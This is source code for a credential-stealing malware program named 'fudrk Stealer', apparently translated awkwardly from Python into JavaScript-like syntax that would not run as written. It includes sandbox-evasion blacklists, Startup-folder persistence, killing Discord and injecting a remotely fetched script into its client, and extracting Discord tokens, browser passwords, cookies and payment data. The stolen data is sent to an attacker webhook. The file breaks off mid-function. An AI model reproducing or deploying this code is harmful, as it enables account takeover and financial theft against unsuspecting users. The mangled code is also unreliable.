const os = require('os');
const re = require('re');
const sys = require('sys');
const time = require('time');
const shutil = require('shutil');
const requests = require('requests');
const random = require('random');
const warnings = require('warnings');
const threading = require('threading');
const subprocess = require('subprocess');
const executable = require('sys').executable;
const stderr = require('sys').stderr;
const base64 = require('base64');
const json = require('json');
const zipfile = require('zipfile');
const sqlite3 = require('sqlite3');
const urllib = require('urllib');
const windll = require('windll');
const wintypes = require('wintypes');
const byref = require('byref');
const cdll = require('cdll');
const structure = require('structure');
const pointer = require('pointer');
const c_char = require('c_char');
const c_buffer = require('c_buffer');
const Crypto = require('Crypto');
const json = require('json');
const socket = require('socket');
const uuid = require('uuid');
const getpass = require('getpass');

const blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg'];
const username = getpass.getuser();
if (blacklistUsers.includes(username.toLowerCase())) {
    os._exit(0);
}

function kontrol() {
    const blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42'];
    const hostname = socket.gethostname();
    if (blacklistUsername.some(name => hostname.includes(name))) {
        os._exit(0);
    }
}
kontrol();

const BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e'];
const mac_address = uuid.getnode();
if (BLACKLIST1.includes(uuid.UUID(int=mac_address).toString())) {
    os._exit(0);
}

class NullWriter {
    write(arg) {
        return;
    }
}

warnings.filterwarnings("ignore");
const null_writer = new NullWriter();
stderr = null_writer;

const ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
];

for (const module of ModuleRequirements) {
    try {
        require(module[0]);
    } catch {
        subprocess.Popen(`${executable} -m pip install ${module[1]} --quiet`, { shell: true });
        time.sleep(3);
    }
}

const h00k = "WEBHOOK HERE";
const inj3c710n_url = "https://raw.githubusercontent.com/fudrk/injection/main/index.js";

class DATA_BLOB extends Structure {
    _fields_ = [
        ['cbData', wintypes.DWORD],
        ['pbData', POINTER(c_char)]
    ];
}

function G371P() {
    try {
        return requests.get("https://api.ipify.org").text.strip();
    } catch {
        return "None";
    }
}

function Z1PF01D3r(foldername, target_dir) {
    const zipobj = new zipfile.ZipFile(temp + "/" + foldername + ".zip", 'w', zipfile.ZIP_DEFLATED);
    const rootlen = target_dir.length + 1;
    for (const [base, dirs, files] of os.walk(target_dir)) {
        for (const file of files) {
            const fn = os.path.join(base, file);
            if (!fn.includes("user_data")) {
                zipobj.write(fn, fn.slice(rootlen));
            }
        }
    }
}

function G37D474(blob_out) {
    const cbData = blob_out.cbData;
    const pbData = blob_out.pbData;
    const buffer = new c_buffer(cbData);
    cdll.msvcrt.memcpy(buffer, pbData, cbData);
    windll.kernel32.LocalFree(pbData);
    return buffer.raw;
}

function CryptUnprotectData(encrypted_bytes, entropy = '') {
    const buffer_in = new c_buffer(encrypted_bytes, encrypted_bytes.length);
    const buffer_entropy = new c_buffer(entropy, entropy.length);
    const blob_in = new DATA_BLOB(encrypted_bytes.length, buffer_in);
    const blob_entropy = new DATA_BLOB(entropy.length, buffer_entropy);
    const blob_out = new DATA_BLOB();
    if (windll.crypt32.CryptUnprotectData(blob_in, null, blob_entropy, null, null, 0x01, blob_out)) {
        return G37D474(blob_out);
    }
}

function D3CrYP7V41U3(buff, master_key = null) {
    const starts = buff.toString('utf8', 0, 3);
    if (starts === 'v10' || starts === 'v11') {
        const iv = buff.slice(3, 15);
        const payload = buff.slice(15);
        const cipher = new Crypto.Cipher.AES(master_key, Crypto.Cipher.AES.MODE_GCM, iv);
        let decrypted_pass = cipher.decrypt(payload);
        decrypted_pass = decrypted_pass.slice(0, -16);
        try {
            decrypted_pass = decrypted_pass.toString();
        } catch {
            return decrypted_pass;
        }
    }
}

function L04DUr118(h00k, data = '', headers = '') {
    for (let i = 0; i < 8; i++) {
        try {
            if (headers !== '') {
                return requests.get(h00k, { data: data, headers: headers });
            } else {
                return requests.get(h00k, { data: data });
            }
        } catch {
            continue;
        }
    }
}

function G108411NF0() {
    try {
        const username = os.getenv("USERNAME");
        const ipdatanojson = requests.get(`https://geolocation-db.com/jsonp/${IP}`).text.replace('callback(', '').replace('})', '}');
        const ipdata = json.loads(ipdatanojson);
        const contry = ipdata["country_name"];
        const contryCode = ipdata["country_code"].toLowerCase();
        let globalinfo = '';
        if (contryCode === "not found") {
            globalinfo = `:rainbow_flag:  - \`${username.toUpperCase()} | ${IP} (${contry})\``;
        } else {
            globalinfo = `:flag_${contryCode}:  - \`${username.toUpperCase()} | ${IP} (${contry})\``;
        }
        return globalinfo;
    } catch {
        return `:rainbow_flag:  - \`${username.toUpperCase()}\``;
    }
}

function TrU57(C00K13s) {
    const data = C00K13s.toString();
    const tim = data.match(/.google.com/g);
    const DETECTED = tim.length < -1;
    return DETECTED;
}

const process_list = os.popen('tasklist').readlines();
for (const process of process_list) {
    if (process.includes("Discord")) {
        const pid = parseInt(process.split()[1]);
        os.system(`taskkill /F /PID ${pid}`);
    }
}

function inj3c710n() {
    const username = os.getlogin();
    const folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'];
    for (const folder_name of folder_list) {
        const deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name);
        if (os.path.isdir(deneme_path)) {
            for (const [subdir, dirs, files] of os.walk(deneme_path)) {
                if (subdir.includes('app-')) {
                    for (const dir of dirs) {
                        if (dir.includes('modules')) {
                            const module_path = os.path.join(subdir, dir);
                            for (const [subsubdir, subdirs, subfiles] of os.walk(module_path)) {
                                if (subsubdir.includes('discord_desktop_core-')) {
                                    for (const [subsubsubdir, subsubdirs, subsubfiles] of os.walk(subsubdir)) {
                                        if (subsubsubdir.includes('discord_desktop_core')) {
                                            for (const file of subsubfiles) {
                                                if (file === 'index.js') {
                                                    const file_path = os.path.join(subsubsubdir, file);
                                                    let injeCTmED0cT0r_cont = requests.get(inj3c710n_url).text;
                                                    injeCTmED0cT0r_cont = injeCTmED0cT0r_cont.replace("%WEBHOOK%", h00k);
                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(injeCTmED0cT0r_cont);
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

inj3c710n();

function G37C0D35(token) {
    try {
        let codes = "";
        const headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        };
        const codess = json.loads(requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", { headers: headers }).text);
        for (const code of codess) {
            try {
                codes += `<a:hira_kasaanahtari:886942856969875476> **${code['promotion']['outbound_title']}**\n<:Rightdown:891355646476296272> \`${code['code']}\`\n`;
            } catch {
                continue;
            }
        }
        const nitrocodess = json.loads(requests.get("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", { headers: headers }).text);
        if (nitrocodess.length === 0) {
            return codes;
        }
        for (const element of nitrocodess) {
            const sku_id = element['sku_id'];
            const subscription_plan_id = element['subscription_plan']['id'];
            const name = element['subscription_plan']['name'];
            const url = `https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id=${sku_id}&subscription_plan_id=${subscription_plan_id}`;
            const nitrrrro = json.loads(requests.get(url, { headers: headers }).text);
            for (const el of nitrrrro) {
                const cod = el['code'];
                try {
                    codes += `<a:hira_kasaanahtari:886942856969875476> **${name}**\n<:Rightdown:891355646476296272> \`https://discord.gift/${cod}\`\n`;
                } catch {
                    continue;
                }
            }
        }
        return codes;
    } catch {
        return "";
    }
}

function G3781111N6(token) {
    const headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    };
    try {
        const billingjson = json.loads(requests.get("https://discord.com/api/users/@me/billing/payment-sources", { headers: headers }).text);
    } catch {
        return false;
    }
    if (billingjson.length === 0) {
        return "`None`";
    }
    let billing = "";
    for (const methode of billingjson) {
        if (methode["invalid"] === false) {
            if (methode["type"] === 1) {
                billing += ":credit_card:";
            } else if (methode["type"] === 2) {
                billing += ":parking: ";
            }
        }
    }
    return billing;
}

function G3784D63(flags) {
    if (flags === 0) {
        return '';
    }
    let OwnedBadges = '';
    const badgeList = [
        { "Name": 'Active_Developer', "Value": 4194304, "Emoji": '<:active:1045283132796063794> ' },
        { "Name": 'Early_Verified_Bot_Developer', "Value": 131072, "Emoji": "<:developer:874750808472825986> " },
        { "Name": 'Bug_Hunter_Level_2', "Value": 16384, "Emoji": "<:bughunter_2:874750808430874664> " },
        { "Name": 'Early_Supporter', "Value": 512, "Emoji": "<:early_supporter:874750808414113823> " },
        { "Name": 'House_Balance', "Value": 256, "Emoji": "<:balance:874750808267292683> " },
        { "Name": 'House_Brilliance', "Value": 128, "Emoji": "<:brilliance:874750808338608199> " },
        { "Name": 'House_Bravery', "Value": 64, "Emoji": "<:bravery:874750808388952075> " },
        { "Name": 'Bug_Hunter_Level_1', "Value": 8, "Emoji": "<:bughunter_1:874750808426692658> " },
        { "Name": 'HypeSquad_Events', "Value": 4, "Emoji": "<:hypesquad_events:874750808594477056> " },
        { "Name": 'Partnered_Server_Owner', "Value": 2, "Emoji": "<:partner:874750808678354964> " },
        { "Name": 'Discord_Employee', "Value": 1, "Emoji": "<:staff:874750808728666152> " }
    ];
    for (const badge of badgeList) {
        if (flags / badge["Value"] !== 0) {
            OwnedBadges += badge["Emoji"];
            flags = flags % badge["Value"];
        }
    }
    return OwnedBadges;
}

function G37UHQFr13ND5(token) {
    const badgeList = [
        { "Name": 'Active_Developer', "Value": 4194304, "Emoji": '<:active:1045283132796063794> ' },
        { "Name": 'Early_Verified_Bot_Developer', "Value": 131072, "Emoji": "<:developer:874750808472825986> " },
        { "Name": 'Bug_Hunter_Level_2', "Value": 16384, "Emoji": "<:bughunter_2:874750808430874664> " },
        { "Name": 'Early_Supporter', "Value": 512, "Emoji": "<:early_supporter:874750808414113823> " },
        { "Name": 'House_Balance', "Value": 256, "Emoji": "<:balance:874750808267292683> " },
        { "Name": 'House_Brilliance', "Value": 128, "Emoji": "<:brilliance:874750808338608199> " },
        { "Name": 'House_Bravery', "Value": 64, "Emoji": "<:bravery:874750808388952075> " },
        { "Name": 'Bug_Hunter_Level_1', "Value": 8, "Emoji": "<:bughunter_1:874750808426692658> " },
        { "Name": 'HypeSquad_Events', "Value": 4, "Emoji": "<:hypesquad_events:874750808594477056> " },
        { "Name": 'Partnered_Server_Owner', "Value": 2, "Emoji": "<:partner:874750808678354964> " },
        { "Name": 'Discord_Employee', "Value": 1, "Emoji": "<:staff:874750808728666152> " }
    ];
    const headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    };
    try {
        const friendlist = json.loads(requests.get("https://discord.com/api/v6/users/@me/relationships", { headers: headers }).text);
    } catch {
        return false;
    }
    let uhqlist = '';
    for (const friend of friendlist) {
        let OwnedBadges = '';
        const flags = friend['user']['public_flags'];
        for (const badge of badgeList) {
            if (flags / badge["Value"] !== 0 && friend['type'] === 1) {
                if (!badge["Name"].includes("House") && badge["Name"] !== "Active_Developer") {
                    OwnedBadges += badge["Emoji"];
                }
                flags = flags % badge["Value"];
            }
        }
        if (OwnedBadges !== '') {
            uhqlist += `${OwnedBadges} | **${friend['user']['username']}`;
        }
    }
    return uhqlist !== '' ? uhqlist : "`No HQ Friends Found`";
}

function G37UHQ6U11D5(token) {
    try {
        let uhqguilds = '';
        const headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        };
        const guilds = json.loads(requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", { headers: headers }).text);
        for (const guild of guilds) {
            if (guild["approximate_member_count"] < 1) {
                continue;
            }
            if (guild["owner"] || guild["permissions"] === "4398046511103") {
                const inv = json.loads(requests.get(`https://discord.com/api/v6/guilds/${guild['id']}/invites`, { headers: headers }).text);
                let cc = false;
                try {
                    cc = `https://discord.gg/${inv[0]['code']}`;
                } catch {
                    cc = false;
                }
                uhqguilds += `<a:CH_IconArrowRight:715585320178941993> [${guild['name']}] **${guild['approximate_member_count']} Members**\n`;
            }
        }
        if (uhqguilds === '') {
            return '`No HQ Guilds Found`';
        }
        return uhqguilds;
    } catch {
        return 'No HQ Guilds Found';
    }
}

function G3770K3N1NF0(token) {
    const headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    };
    const userjson = json.loads(requests.get("https://discordapp.com/api/v6/users/@me", { headers: headers }).text);
    const username = userjson["username"];
    const hashtag = userjson["discriminator"];
    const email = userjson["email"];
    const idd = userjson["id"];
    const pfp = userjson["avatar"];
    const flags = userjson["public_flags"];
    let nitro = "";
    let phone = "";
    if ("premium_type" in userjson) {
        const nitrot = userjson["premium_type"];
        if (nitrot === 1) {
            nitro = "<:classic:896119171019067423> ";
        } else if (nitrot === 2) {
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> ";
        }
    }
    phone = userjson["phone"] !== null ? `\`${userjson["phone"]}\`` : "`None`";
    return [username, hashtag, email, idd, pfp, flags, nitro, phone];
}

function CH3CK70K3N(token) {
    const headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    };
    try {
        requests.get("https://discordapp.com/api/v6/users/@me", { headers: headers });
        return true;
    } catch {
        return false;
    }
}

const currentFilePath = os.path.dirname(require.main.filename);
const fileName = os.path.basename(process.argv[1]);
const filePath = path.join(currentFilePath, fileName);
const startupFolderPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
const startupFilePath = path.join(startupFolderPath, fileName);
if (os.path.abspath(filePath) === os.path.abspath(startupFilePath)) {
    return;
}

if (path.join(os.path.abspath(filePath)).toLowerCase() !== path.join(os.path.abspath(startupFilePath)).toLowerCase()) {
    fs.copyFileSync(filePath, startupFilePath);
}

function Tr1M(obj) {
    if (obj.length > 1000) {
        let f = obj.split("\n");
        obj = "";
        for (let i = 0; i < f.length; i++) {
            if (obj.length + f[i].length >= 1000) {
                obj += "...";
                break;
            }
            obj += f[i] + "\n";
        }
    }
    return obj;
}

function UP104D70K3N(token, path) {
    let h00k = global.h00k;
    let headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    };
    let { username, hashtag, email, idd, pfp, flags, nitro, phone } = G3770K3N1NF0(token);
    pfp = pfp !== null ? `https://cdn.discordapp.com/avatars/${idd}/${pfp}` : "https://raw.githubusercontent.com/fudrk/fudrk-Stealer/main/img/fudrk.jpg";
    let billing = G3781111N6(token);
    let badge = G3784D63(flags);
    let friends = Tr1M(G37UHQFr13ND5(token));
    let guilds = Tr1M(G37UHQ6U11D5(token));
    let codes = Tr1M(G37C0D35(token));
    if (codes === "") {
        codes = "`No Gifts Found`";
    }
    if (billing === "") {
        billing = "🔒";
    }
    if (badge === "" && nitro === "") {
        badge = ":None";
        nitro = "";
    }
    if (phone === "") {
        phone = "🔒";
    }
    if (friends === "") {
        friends = "No Rare Friends";
    }
    if (guilds === "") {
        guilds = ":lock:";
    }
    path = path.replace("\\", "/");
    let data = {
        "content": `${GLINFO} **Found in** \`${path}\``,
        "embeds": [
            {
                "color": 2895667,
                "fields": [
                    {
                        "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                        "value": "" + token + ""
                    },
                    {
                        "name": "<:mail:750393870507966486> Email:",
                        "value": "" + email + "",
                        "inline": true
                    },
                    {
                        "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                        "value": "`" + phone + "`",
                        "inline": true
                    },
                    {
                        "name": "<:mc_earth:589630396476555264> IP:",
                        "value": "" + G371P() + "",
                        "inline": true
                    },
                    {
                        "name": "<:woozyface:874220843528486923> Badges:",
                        "value": nitro + badge,
                        "inline": true
                    },
                    {
                        "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                        "value": billing,
                        "inline": true
                    },
                    {
                        "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                        "value": friends,
                        "inline": false
                    },
                    {
                        "name": "<:woozyface:874220843528486923> HQ Guilds:",
                        "value": guilds,
                        "inline": false
                    },
                    {
                        "name": "<a:mavikirmizi:853238372591599617> Gift Codes:",
                        "value": codes,
                        "inline": false
                    }
                ],
                "author": {
                    "name": username,
                    "icon_url": pfp
                },
                "footer": {
                    "text": "fudrk Stealer",
                    "icon_url": "https://raw.githubusercontent.com/fudrk/fudrk-Stealer/main/img/fudrk.jpg"
                },
                "thumbnail": {
                    "url": pfp
                }
            }
        ],
        "username": "fudrk Stealer |",
        "avatar_url": "https://raw.githubusercontent.com/fudrk/fudrk-Stealer/main/img/fudrk.jpg",
        "attachments": []
    };
    L04DUr118(h00k, JSON.stringify(data).encode(), headers);
}

function r3F0rM47(listt) {
    let e = listt.match(/(\w+[a-z])/g);
    while (e.includes("https")) {
        e.splice(e.indexOf("https"), 1);
    }
    while (e.includes("com")) {
        e.splice(e.indexOf("com"), 1);
    }
    while (e.includes("net")) {
        e.splice(e.indexOf("net"), 1);
    }
    return Array.from(new Set(e));
}

function UP104D(name, link) {
    let headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    };
    if (name.includes("Data Searcher")) {
        let data = {
            "content": GLINFO,
            "embeds": [
                {
                    "title": "fudrk Stealer | Data Extractor",
                    "color": 2895667,
                    "fields": link,
                    "footer": {
                        "text": "fudrk Stealer",
                        "icon_url": "https://raw.githubusercontent.com/fudrk/fudrk-Stealer/main/img/fudrk.jpg"
                    }
                }
            ],
            "username": "fudrk Stealer",
            "avatar_url": "https://raw.githubusercontent.com/fudrk/fudrk-Stealer/main/img/fudrk.jpg",
            "attachments": []
        };
        L04DUr118(h00k, JSON.stringify(data).encode(), headers);
        return;
    }
    if (name === "kiwi") {
        let string = link.split("\n\n");
        let endlist = [];
        for (let i = 0; i < string.length; i++) {
            let temp = string[i].split("\n");
            temp = temp.filter(Boolean);
            let val = "";
            for (let x = 0; x < temp.length; x++) {
                if (temp[x].startsWith("└─")) {
                    val += temp[x] + "\n";
                }
            }
            if (temp.length > 1) {
                endlist.push({ "name": temp[0], "value": val, "inline": false });
            }
        }
        let data = {
            "content": GLINFO,
            "embeds": [
                {
                    "color": 2895667,
                    "fields": endlist,
                    "title": "fudrk Stealer | File Stealer",
                    "footer": {
                        "text": "fudrk Stealer",
                        "icon_url": "https://raw.githubusercontent.com/fudrk/fudrk-Stealer/main/img/fudrk.jpg"
                    }
                }
            ],
            "username": "fudrk Stealer",
            "avatar_url": "https://raw.githubusercontent.com/fudrk/fudrk-Stealer/main/img/fudrk.jpg",
            "attachments": []
        };
        L04DUr118(h00k, JSON.stringify(data).encode(), headers);
        return;
    }
}

function Wr173F0rF113(data, name) {
    let path = process.env.TEMP + `/cr${name}.txt`;
    fs.writeFileSync(path, data.join("\n"));
}

function G3770K3N(path, arg) {
    if (!fs.existsSync(path)) {
        return;
    }
    path += arg;
    for (let file of fs.readdirSync(path)) {
        if (file.endsWith(".log") || file.endsWith(".ldb")) {
            let lines = fs.readFileSync(`${path}/${file}`, { encoding: "utf-8" }).split("\n").map(line => line.trim()).filter(line => line !== "");
            for (let line of lines) {
                for (let regex of [r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"]) {
                    let tokens = line.match(regex);
                    if (tokens !== null) {
                        let T0K3Ns = global.T0K3Ns;
                        for (let token of tokens) {
                            let tokenDecoded = D3CrYP7V41U3(Buffer.from(token.split('dQw4w9WgXcQ:')[1], "base64").toString(), master_key);
                            if (CH3CK70K3N(tokenDecoded)) {
                                if (!T0K3Ns.includes(tokenDecoded)) {
                                    T0K3Ns.push(tokenDecoded);
                                    UP104D70K3N(tokenDecoded, path);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

function SQ17H1N6(pathC, tempfold, cmd) {
    fs.copyFileSync(pathC, tempfold);
    let conn = sql_connect(tempfold);
    let cursor = conn.cursor();
    cursor.execute(cmd);
    let data = cursor.fetchall();
    cursor.close();
    conn.close();
    fs.unlinkSync(tempfold);
    return data;
}

function G37P455W(path, arg) {
    try {
        let P455w = global.P455w;
        let P455WC0UNt = global.P455WC0UNt;
        if (!fs.existsSync(path)) {
            return;
        }
        let pathC = `${path}${arg}/Login Data`;
        if (fs.statSync(pathC).size === 0) {
            return;
        }
        let tempfold = `${temp}cr${Math.random().toString(36).substring(7)}.db`;
        let data = SQ17H1N6(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;");
        let pathKey = `${path}/Local State`;
        let local_state = JSON.parse(fs.readFileSync(pathKey, { encoding: "utf-8" }));
        let master_key = Buffer.from(local_state['os_crypt']['encrypted_key'], "base64");
        master_key = CryptUnprotectData(master_key.slice(5));
        for (let row of data) {
            if (row[0] !== "") {
                for (let wa of k3YW0rd) {
                    let old = wa;
                    if (wa.includes("https")) {
                        let tmp = wa;
                        wa = tmp.split('[')[1].split(']')[0];
                    }
                    if (wa.includes(row[0])) {
                        if (!p45WW0rDs.includes(old)) {
                            p45WW0rDs.push(old);
                        }
                    }
                }
                P455w.push(`UR1: ${row[0]} | U53RN4M3: ${row[1]} | P455W0RD: ${D3CrYP7V41U3(row[2], master_key)}`);
                P455WC0UNt++;
            }
        }
        Wr173F0rF113(P455w, 'passwords');
    } catch (error) {
        console.error(error);
    }
}

function G37C00K13(path, arg) {
    try {
        let C00K13s = global.C00K13s;
        let C00K1C0UNt = global.C00K1C0UNt;
        if (!fs.existsSync(path)) {
            return;
        }
        let pathC = `${path}${arg}/Cookies`;
        if (fs.statSync(pathC).size === 0) {
            return;
        }
        let tempfold = `${temp}cr${Math.random().toString(36).substring(7)}.db`;
        let data = SQ17H1N6(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ");
        let pathKey = `${path}/Local State`;
        let local_state = JSON.parse(fs.readFileSync(pathKey, { encoding: "utf-8" }));
        let master_key = Buffer.from(local_state['os_crypt']['encrypted_key'], "base64");
        master_key = CryptUnprotectData(master_key.slice(5));
        for (let row of data) {
            if (row[0] !== "") {
                for (let wa of k3YW0rd) {
                    let old = wa;
                    if (wa.includes("https")) {
                        let tmp = wa;
                        wa = tmp.split('[')[1].split(']')[0];
                    }
                    if (wa.includes(row[0])) {
                        if (!c00K1W0rDs.includes(old)) {
                            c00K1W0rDs.push(old);
                        }
                    }
                }
                C00K13s.push(`${row[0]}	TRUE	/	FALSE	2597573456	${row[1]}	${D3CrYP7V41U3(row[2], master_key)}`);
                C00K1C0UNt++;
            }
        }
        Wr173F0rF113(C00K13s, 'cookies');
    } catch (error) {
        console.error(error);
    }
}

function G37CC5(path, arg) {
    try {
        let CCs = global.CCs;
        let CC5C0UNt = global.CC5C0UNt;
        if (!fs.existsSync(path)) {
            return;
        }
        let pathC = `${path}${arg}/Web Data`;
        if (fs.statSync(pathC).size === 0) {
            return;
        }
        let tempfold = `${temp}cr${Math.random().toString(36).substring(7)}.db`;
